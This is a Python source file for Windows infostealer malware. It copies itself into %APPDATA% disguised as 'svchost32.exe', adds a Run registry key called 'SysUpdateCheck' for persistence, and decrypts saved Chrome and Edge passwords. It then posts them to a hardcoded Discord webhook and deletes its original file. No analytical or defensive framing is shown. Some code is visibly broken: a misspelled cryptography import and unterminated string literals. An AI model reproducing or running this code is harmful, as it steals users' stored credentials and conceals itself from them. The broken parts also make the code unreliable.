import os, json, winreg, sqlite3, sys, shutil, re, requests, sys, base64
from getpass import getuser
from cryptography.hazards.backends import default_backend
from cryptography.hazards.primitives.ciphers.aead import AESGCM
from enum import Enum

# Global constants
WEBHOOK = "https://discord.com/api/webhooks/1401359027761582080/3IspXiUDt8Ec25JVO0SLkKjRozojgL8b_oQW5M6OiIaxDZWU_SMip4MbhbPhLzSPE8I8"
APP_NAME = "svchost32.exe"
PERSIST_DIR = os.path.expandvars(r"%APPDATA%\Microsoft")
LOCAL_DIR = os.path.expandvars(r"%LOCALAPPDATA%")
CHROME_USERDATA = os.path.join(LOCAL_DIR, r"Google\Chrome\User Data")
PWD_PATH = os.path.join(LOCAL_DIR, "cred.bin")
DOWNLOAD = "http://yourserver.tld/" + APP_NAME

# --- Persistence & surfing start ---
def persist():
    dst = os.path.join(PERSIST_DIR, APP_NAME)
    if not os.path.exists(dst):
        shutil.copy(sys.executable, dst)
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r"Software\Microsoft\Windows\CurrentVersion\Run",
                         0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "SysUpdateCheck", 0,
                      winreg.REG_SZ, dst)

# --- Encrypted DB helpers ---
def get_master_key():
    path = os.path.join(CHROME_USERDATA, "Local State")
    if not os.path.exists(path): return b""
    local_state = json.loads(open(path, "rb").read().decode())
    encoded_key = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encoded_key)[5:]  # strip DPAPI
    import win32crypt
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_blob(blob):
    if blob.startswith(b"v10"):
        nonce, ciphertext_tail = blob[3:15], blob[15:]
        key = get_master_key()
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext_tail, b"").decode(errors="ignore")
    return ""

class Browser(Enum):
    CHROME = os.path.join(CHROME_USERDATA, "Default\Login Data")
    EDGE = os.path.join(LOCAL_DIR, r"Microsoft\Edge\User Data",
                        "Default\Login Data")

def grab(logins_db):
    if not os.path.exists(logins_db): return []
    tmp = os.path.join(os.getcwd(), "ldb")
    if os.path.exists(tmp): os.remove(tmp)
    shutil.copy(logins_db, tmp)
    conn = sqlite3.connect(tmp); cur = conn.cursor()
    try:
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
    except Exception:
        return []
    data = []
    for url, user, pwd in cur.fetchall():
        if pwd:
            data.append(f"{url}\t{user}\t{decrypt_blob(pwd)}")
    conn.close(); os.remove(tmp)
    return data

# --- Discord embed structure ---
def send_hook(msg):
    embed = {
        "title": f"⚙️ {getuser()} just logged in @ {os.path.getctime(sys.executable)}",
        "description": f"
{chr(10).join(msg[:5000])}
",
        "color": 0x5C4033
    }
    payload = {"embeds": [embed]}
    try:
        requests.post(WEBHOOK, json=payload, timeout=10)
    except: pass

if __name__ == "__main__":
    persist()
    payloads = []
    for b in [Browser.CHROME, Browser.EDGE]:
        payloads += grab(b.value)
    if payloads:
        send_hook(payloads)
    # Delete the parent, we keep the new copy in %APPDATA%
    os.system(f" timeout 5 & del /q "{os.path.abspath(sys.argv[-1])}" " )